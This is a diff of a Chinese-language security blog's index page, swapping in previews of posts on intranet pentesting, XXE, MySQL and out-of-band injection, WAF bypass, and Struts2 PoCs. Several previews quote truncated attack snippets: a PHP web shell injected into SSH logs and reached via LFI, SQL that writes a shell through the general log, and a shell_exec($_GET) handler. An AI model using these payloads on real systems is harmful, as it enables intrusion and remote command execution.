@@ -18,7 +18,7 @@
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.com/">
+    <link rel="canonical" href="http://rootclay.github.io/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -72,10 +72,6 @@
             background-image: url('/img/header_img/home-bg-2-dark.png') 
             /*config*/
         
-    }
-    
-    #signature{
-        background-image: url('/img/signature/BeanTechSign-white.png');
     }
     
 </style>
@@ -213,9 +209,344 @@
 
 <div class="post-preview">
 
-    <a href="/2017/06/24/burp/">
+    <a href="/2017/05/29/内网/">
         <h2 class="post-title">
-            [Tools] Burpsuite 重要插件
+            内网渗透
+        </h2>
+        <h3 class="post-subtitle">
+            转自小组学长内网学习笔记.
+        </h3>
+        <div class="post-content-preview">
+            Team:Syclover
+Author:L3m0n
+域环境搭建
+准备：
+DC: win2008
+DM: win2003
+DM: winxp
+
+win2008(域控)
+1、修改计算机名：
+
+2、配置固定ip:
+其中网关设置错误，应该为192.168.206.2，开始默认的网管
+
+3、服务器管理器—角色：
+
+4、配置域服务:
+dos下面输入dcpromo
+
+Ps：这里可能会因为本地admini......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-05-29
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Web" title="Web">Web</a>
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/05/29/xxe/">
+        <h2 class="post-title">
+            XXE
+        </h2>
+        <h3 class="post-subtitle">
+            Blind-XXE复现笔记.
+        </h3>
+        <div class="post-content-preview">
+            环境准备
+Docker
+12docker run -d -p 8080:80 -v /Users/rootclay/web/xxe:/var/www/html php:apachedocker run -it -v /Users/rootclay/web/payload:/var/www/html php:apache
+12345.├── /Users/rootclay/web/xxe│  ......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-05-29
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Web" title="Web">Web</a>
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/04/21/MySQL注入攻击与防御/">
+        <h2 class="post-title">
+            MySQL注入攻击与防御
+        </h2>
+        <h3 class="post-subtitle">
+            本文主要是做一个Mysql的注入总结，对于Mysql来说利用的方式太过于灵活，这里总结了一些主流的一些姿势，如果有好的姿势可以多加交流.
+        </h3>
+        <div class="post-content-preview">
+            注入常用函数与字符
+下面几点是注入中经常会用到的语句
+
+控制语句操作(select, case, if(), …)
+比较操作(=, like, mod(), …)
+字符串的猜解操作(mid(), left(), rpad(), …)
+字符串生成操作(0x61, hex(), conv()(使用conv([10-36],10,36)可以实现所有字符的表示))
+
+测试注入
+可以用以下语句对一个可......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-04-21
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Web" title="Web">Web</a>
+            
+              <a href="/tags/#SQL" title="SQL">SQL</a>
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/04/09/Mysql_oob/">
+        <h2 class="post-title">
+            Out of band injection
+        </h2>
+        <h3 class="post-subtitle">
+            Mysql中的带外注入.
+        </h3>
+        <div class="post-content-preview">
+            
+这篇文章主要讲关于mysql的带外注入,主要利用的函数为load_file()和select … into outfile/dumpfile还有SMB服务之类的注入
+
+那什么是带外通道注入呢?
+带外通道攻击主要是利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.
+限制
+在MySQL中，存在一个称为secure_file_priv......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-04-09
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Web" title="Web">Web</a>
+            
+              <a href="/tags/#SQL" title="SQL">SQL</a>
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/03/23/lfi_ssh/">
+        <h2 class="post-title">
+            LFI SSH日志
+        </h2>
+        <h3 class="post-subtitle">
+            通过LFI包含到SSH日志来获取SHELL.
+        </h3>
+        <div class="post-content-preview">
+            LFI SSH日志
+1ssh '&lt;?php system($_GET[‘c’]); ?&gt;'@192.168.32.137
+1curl http://192.168.32.137/lfi.php?file=/var/log/auth.log&amp;c=ls
+Tips:
+123/var/log/auth.log只有ubuntu系有。其实对linux，可以包含/var/log/wtm......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-03-23
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Web" title="Web">Web</a>
+            
+              <a href="/tags/#SSH" title="SSH">SSH</a>
+            
+              <a href="/tags/#LFI" title="LFI">LFI</a>
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/03/23/mysql日志包含拿shell/">
+        <h2 class="post-title">
+            SQL语句利用日志写shell
+        </h2>
+        <h3 class="post-subtitle">
+            前不久刚出的SQL之间利用日志获取SHELL的姿势.
+        </h3>
+        <div class="post-content-preview">
+            outfile被禁止，或者写入文件被拦截
+
+1234show variables like '%general%';  #查看配置set global general_log = on;  #开启general log模式set global general_log_file = '/var/www/html/1.php';   #设置日志目录为shell地址select '&lt;?php......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-03-23
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Web" title="Web">Web</a>
+            
+              <a href="/tags/#SQL" title="SQL">SQL</a>
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/03/20/docker三剑客/">
+        <h2 class="post-title">
+            Docker 三侠客
+        </h2>
+        <h3 class="post-subtitle">
+            Docker 三侠客.
+        </h3>
+        <div class="post-content-preview">
+            少侠：Docker
+少侠：有内力修习，有趁手兵器，大多十分年轻便已经成名，侠之标准是【维护江湖道义，名声大振】
+最简单的Docker命令教程网上一大堆了这里举几个经常用的就好
+
+
+安装：
+sudo apt-get install docker.io
+
+
+拉取：
+docker pull ubuntu:16.04
+
+
+运行：
+docker run -it ubuntu:16.04
+
+
+查看：
+
+......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-03-20
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Tools" title="Tools">Tools</a>
+            
+              <a href="/tags/#Docker" title="Docker">Docker</a>
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/03/19/struts2/">
+        <h2 class="post-title">
+            Struts2漏洞
+        </h2>
+        <h3 class="post-subtitle">
+            Struts2漏洞POC汇总.
+        </h3>
+        <div class="post-content-preview">
+            
+Struts2框架漏洞不断，鉴于struts2使用之广泛，本文汇总Struts2系列漏洞的Poc，给网络管理员或者站长提供查询便利，以便更好的检测自身网站存在的漏洞，也可以让安全从业者更好的了解此漏洞。
+
+struts2-045
+1234567891011121314import sysimport requestsdef poc():	C = "%&#123;(#nike='multip......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-03-19
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Web" title="Web">Web</a>
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/03/18/Burp_bypass_plugin/">
+        <h2 class="post-title">
+            Bypass WAF --- Burp Plugin
+        </h2>
+        <h3 class="post-subtitle">
+            一些常见的burp插件,加上这些插件来绕过一定的WAF.
+        </h3>
+        <div class="post-content-preview">
+            
+To use this plugin to add the necessary headers, first you need to either download the
+Python version of the plugin, the Java version of the plugin, or the Java source and
+compile yourself. Once y......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-03-18
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Tools" title="Tools">Tools</a>
+            
+              <a href="/tags/#Web" title="Web">Web</a>
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/03/18/burp/">
+        <h2 class="post-title">
+            Burpsuite Plugin+
         </h2>
         <h3 class="post-subtitle">
             一些常见的burp插件.
@@ -242,7 +573,7 @@ bypasswaf：让你轻松绕过waf防御（不要迷信waf）.
     
         <p class="post-meta" style="margin: 10px 0;">
             Posted by Rootclay on
-            2017-06-24
+            2017-03-18
         </p>
         <div class="tags">
             
@@ -256,125 +587,16 @@ bypasswaf：让你轻松绕过waf防御（不要迷信waf）.
 </div>
 <hr>
 
-<div class="post-preview">
-
-    <a href="/2017/03/18/hexo-theme-beantech/">
-        <h2 class="post-title">
-            [Hexo] Theme BeanTech
-        </h2>
-        <h3 class="post-subtitle">
-            This is hexo theme Demo.
-        </h3>
-        <div class="post-content-preview">
-            
-Ported Theme of Hux Blog, Thank Huxpro for designing such a flawless theme.
-This BeanTech theme created by YuHsuan modified from the original Porter Kaijun
-
-Live Demo
-
-
-Usage
-
-I publish the whole ......
-        </div>
-    </a>
-    
-        <p class="post-meta" style="margin: 10px 0;">
-            Posted by Rootclay on
-            2017-03-18
-        </p>
-        <div class="tags">
-            
-              <a href="/tags/#Hexo" title="Hexo">Hexo</a>
-            
-              <a href="/tags/#Blog" title="Blog">Blog</a>
-            
-        </div>
-    
-
-</div>
-<hr>
-
-<div class="post-preview">
-
-    <a href="/2017/03/18/linux_doc_shell/">
-        <h2 class="post-title">
-            [Web] Linux下短字符写shell
-        </h2>
-        <h3 class="post-subtitle">
-            Linux下短字符写shell.
-        </h3>
-        <div class="post-content-preview">
-            Linux下短字符写shell
-代码
-12345&lt;?phpif(strlen($_GET[1]) &lt; 8) &#123;  echo shell_exec($_GET[1]);&#125;?&gt;
-背景知识
-1、linux下写文件
-1a&gt;1.txt
-这样就会在本目录下生成一个1.txt文件，内容会有a
-2、linux下本行无法执行完命令时
-12echo 1&gt;\1.p......
-        </div>
-    </a>
-    
-        <p class="post-meta" style="margin: 10px 0;">
-            Posted by Rootclay on
-            2017-03-18
-        </p>
-        <div class="tags">
-            
-              <a href="/tags/#Web" title="Web">Web</a>
-            
-              <a href="/tags/#Linux" title="Linux">Linux</a>
-            
-        </div>
-    
-
-</div>
-<hr>
-
-<div class="post-preview">
-
-    <a href="/2017/03/18/lfi_ssh/">
-        <h2 class="post-title">
-            [Web] LFI SSH日志
-        </h2>
-        <h3 class="post-subtitle">
-            This is hexo theme Demo.
-        </h3>
-        <div class="post-content-preview">
-            LFI SSH日志
-1ssh '&lt;?php system($_GET[‘c’]); ?&gt;'@192.168.32.137
-1curl http://192.168.32.137/lfi.php?file=/var/log/auth.log&amp;c=ls
-Tips:
-123/var/log/auth.log只有ubuntu系有。其实对linux，可以包含/var/log/wtm......
-        </div>
-    </a>
-    
-        <p class="post-meta" style="margin: 10px 0;">
-            Posted by Rootclay on
-            2017-03-18
-        </p>
-        <div class="tags">
-            
-              <a href="/tags/#Web" title="Web">Web</a>
-            
-              <a href="/tags/#SSH" title="SSH">SSH</a>
-            
-              <a href="/tags/#LFI" title="LFI">LFI</a>
-            
-        </div>
-    
-
-</div>
-<hr>
-
 
 
 <!-- Pager -->
 
 <ul class="pager">
     
+    
+        <li class="next">
+            <a href="/archives/2/">Older Posts &rarr;</a>
+        </li>
     
 </ul>
 
@@ -408,15 +630,6 @@ Tips:
 
         <!-- SNS Link -->
         <ul class="list-inline">
-            
-                <li>
-                    <a href="/feed.xml">
-                        <span class="fa-stack fa-lg">
-                            <i class="fa fa-circle fa-stack-2x"></i>
-                            <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
-                        </span>
-                    </a>
-                </li>
             
             
             
@@ -467,19 +680,23 @@ Tips:
     <ul>
       
         <li>
-          <a href="/2017/06/24/burp/">[Tools] Burpsuite 重要插件</a>
+          <a href="/2017/05/29/内网/">内网渗透</a>
         </li>
       
         <li>
-          <a href="/2017/03/18/hexo-theme-beantech/">[Hexo] Theme BeanTech</a>
+          <a href="/2017/05/29/xxe/">XXE</a>
         </li>
       
         <li>
-          <a href="/2017/03/18/linux_doc_shell/">[Web] Linux下短字符写shell</a>
+          <a href="/2017/04/21/MySQL注入攻击与防御/">MySQL注入攻击与防御</a>
         </li>
       
         <li>
-          <a href="/2017/03/18/lfi_ssh/">[Web] LFI SSH日志</a>
+          <a href="/2017/04/09/Mysql_oob/">Out of band injection</a>
+        </li>
+      
+        <li>
+          <a href="/2017/03/23/lfi_ssh/">LFI SSH日志</a>
         </li>
       
     </ul>
@@ -519,15 +736,6 @@ Tips:
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <ul class="list-inline text-center">
-                
-                    <li>
-                        <a href="/feed.xml">
-                            <span class="fa-stack fa-lg">
-                                <i class="fa fa-circle fa-stack-2x"></i>
-                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
-                            </span>
-                        </a>
-                    </li>
                 
                 
                 
@@ -621,7 +829,7 @@ Tips:
 <script>
     // only load tagcloud.js in tag.html
     if($('#tag_cloud').length !== 0){
-        async("http://rootclay.com/js/jquery.tagcloud.js",function(){
+        async("http://rootclay.github.io/js/jquery.tagcloud.js",function(){
             $.fn.tagcloud.defaults = {
                 //size: {start: 1, end: 1, unit: 'em'},
                 color: {start: '#bbbbee', end: '#0085a1'},
@@ -672,7 +880,7 @@ Tips:
 	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
     <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
 <!-- Image to hack wechat -->
-<img src="http://rootclay.com/img/icon_wechat.png" width="0" height="0" />
+<!-- <img src="http://rootclay.github.io/img/icon_wechat.png" width="0" height="0" /> -->
 <!-- Migrate from head to bottom, no longer block render and still work -->
 
 </body>
